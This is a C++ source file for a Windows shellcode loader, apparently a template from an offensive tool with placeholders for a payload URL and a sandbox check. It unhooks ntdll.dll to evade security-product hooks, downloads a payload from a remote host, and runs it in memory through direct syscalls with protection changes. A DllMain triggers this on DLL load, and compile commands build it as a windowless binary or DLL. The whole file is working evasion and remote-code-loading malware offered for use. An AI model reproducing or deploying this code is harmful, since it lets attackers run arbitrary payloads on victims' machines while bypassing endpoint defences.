
#define _WIN32_WINNT 0x0600
#include <iostream>
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "Wininet.lib")
#include <psapi.h>
#include <winternl.h>

#include <tlhelp32.h>

#include "Syscalls2.h"

#ifndef UNICODE
typedef std::string String;
#else
typedef std::wstring String;
#endif
#define size 1024 * 1024
unsigned char Buffer[size];

unsigned int Buffer_len = sizeof(Buffer);

#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x20007
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000

// REPLACE_SANDBOX_CHECK

//

static int Unhook()
{
	HANDLE pollutedNtdll;
	HANDLE hFile;
	HANDLE hFileMapping;
	LPVOID hMapping;

	// get handle of pollutted ntdll.dll

	LPCSTR Ntdll = "ntdll.dll";
	pollutedNtdll = GetModuleHandleA(Ntdll);

	LPCSTR NtdllPath = "c:\\windows\\system32\\ntdll.dll";

	// open fresh copy of ntdll.dll and map a view of it

	hFile = CreateFileA(NtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return -1;
	}

	hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (!hFileMapping)
	{
		CloseHandle(hFile);
		return -1;
	}

	hMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (!hMapping)
	{
		CloseHandle(hFile);
		CloseHandle(hFileMapping);
		return -1;
	}

	// find .text section of ntdll

	IMAGE_DOS_HEADER *hImgDosHeader = (IMAGE_DOS_HEADER *)hMapping;
	IMAGE_NT_HEADERS *hImgNtHeaders = (IMAGE_NT_HEADERS *)((DWORD_PTR)hMapping + hImgDosHeader->e_lfanew);
	IMAGE_FILE_HEADER hImgFileHeader = (IMAGE_FILE_HEADER)(hImgNtHeaders->FileHeader);
	IMAGE_SECTION_HEADER *hImgSecHeader = (IMAGE_SECTION_HEADER *)((size_t)hImgNtHeaders + sizeof(*hImgNtHeaders));
	DWORD oldprotect = 0;

	for (int i = 0; i < hImgFileHeader.NumberOfSections; i++)
	{
		if (!strcmp((char *)hImgSecHeader[i].Name, ".text"))
		{
			VirtualProtect((LPVOID)((DWORD_PTR)pollutedNtdll + (DWORD_PTR)hImgSecHeader->VirtualAddress),
						   hImgSecHeader->Misc.VirtualSize,
						   PAGE_EXECUTE_READWRITE,
						   &oldprotect);
			if (!oldprotect)
			{
				return -1;
			}
			memcpy((LPVOID)((DWORD_PTR)pollutedNtdll + (DWORD_PTR)hImgSecHeader->VirtualAddress),
				   (LPVOID)((DWORD_PTR)hMapping + (DWORD_PTR)hImgSecHeader->VirtualAddress),
				   hImgSecHeader->Misc.VirtualSize);
			VirtualProtect((LPVOID)((DWORD_PTR)pollutedNtdll + (DWORD_PTR)hImgSecHeader->VirtualAddress),
						   hImgSecHeader->Misc.VirtualSize,
						   oldprotect,
						   &oldprotect);
			if (!oldprotect)
			{
				return -1;
			}
			return 0;
		}
	}
	return -1;
}

int main()
{

	HANDLE hProc = GetCurrentProcess();
	DWORD oldprotect = 0;
	PVOID base_addr = NULL;
	HANDLE thandle = NULL;
	SIZE_T bytesWritten;

	if (!Unhook())
	{
		std::cout << "ntdll unhooked!" << std::endl;
	}

	char *url = (char *)"URLREPLACE";
	DWORD bytes_read;
	HINTERNET internet = InternetOpen("HTTP Downloader", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
	HINTERNET file_handle = InternetOpenUrl(internet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (!(file_handle == NULL))
	{
		BOOL b = InternetReadFile(file_handle, Buffer, Buffer_len, &bytes_read);
		NTSTATUS res = NtAllocateVirtualMemory(hProc, &base_addr, 0, (PSIZE_T)&Buffer_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		res = NtWriteVirtualMemory(hProc, base_addr, (char *)Buffer, Buffer_len, &bytesWritten);
		res = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&Buffer_len, PAGE_NOACCESS, &oldprotect);
		res = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, base_addr, NULL, TRUE, 0, 0, 0, NULL);
		res = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&Buffer_len, PAGE_EXECUTE_READ, &oldprotect);
		res = NtResumeThread(thandle, 0);
		res = NtWaitForSingleObject(thandle, -1, NULL);
		// InternetCloseHandle(internet);
	}
	return 0;
}

BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{ // HANDLE threadhandle;
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		main();
		// threadhandle = CreateThread(NULL, 0, main, NULL, 0, NULL);
		// CloseHandle(threadhandle);
		break;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}

// x86_64-w64-mingw32-g++ CurrentThread.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows

//x86_64-w64-mingw32-g++ CurrentThread.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows -shared -o